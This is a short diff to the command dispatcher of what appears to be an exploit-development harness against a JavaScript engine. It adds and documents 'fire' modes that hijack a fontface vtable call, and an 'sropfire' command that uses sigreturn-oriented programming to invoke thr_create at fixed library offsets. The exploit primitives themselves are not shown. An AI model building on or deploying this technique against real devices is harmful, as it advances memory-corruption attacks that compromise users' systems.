@@ -140,11 +140,13 @@ if (name === 'status') {
          * mapped modules. Usage: rtld */
         cmd = { cmd: 'rtld' }; break;
       case 'fire':
-        /* THE DISPATCH-FIRE: the fontface vtable dispatch fires thr_create
-         * (lk+0x13ED0) with the parent surviving (RIP2-AFTER) - the witness
-         * (the child's tid) read back in the reply.
-         * fire diag -> s3 = thr_self (the non-fatal dispatch proof:
-         * tid at [FO], then the VP restore). Usage: fire [diag] */
+        /* THE GATED REAL-VP DISPATCH-FIRE (#295 + #282):
+         * fire 7 = identity-only, no writes/trigger;
+         * fire 8 = real-module-VP same-value write control only;
+         * fire 6 = real-VP all-real async control, gates off;
+         * fire 5 = real-VP slot3-only gettimeofday A/B probe;
+         * fire   = real-VP slot3-only thr_create, armed witness.
+         * The heap FAKEVT path is retired for payload/control runs (#282). */
         cmd = { cmd: 'fire', diag: clean[1] || '' }; break;
       case 'lcbase':
         /* THE DETERMINISTIC LIBC HUNT: module-band-only harvest ->
@@ -216,6 +218,12 @@ if (name === 'status') {
          * (RDI = the pre-zeroed fake scope; tv copies before tz; every step
          * on a blocking sync beacon). */
         cmd = { cmd: 'e2witness' }; break;
+      case 'sropfire':
+        /* MEASURED-RETURN SROP: the V70 diff-scan finds the native return
+         * slot; sigreturn(lk+0x13ED0) installs thr_create(lk+0x13D20) with
+         * safe args and RSP=that slot; child=thr_exit(lk+0x13EC0).
+         * No getcontext or recovery-RVA guessing. */
+        cmd = { cmd: 'sropfire', mode: clean[1] || '' }; break;
       case 'rawcall':
         /* decode-immune call: redirects, calls, DISCARDS the return
          * untouched (raw returns crash the JSValue engine at first touch),
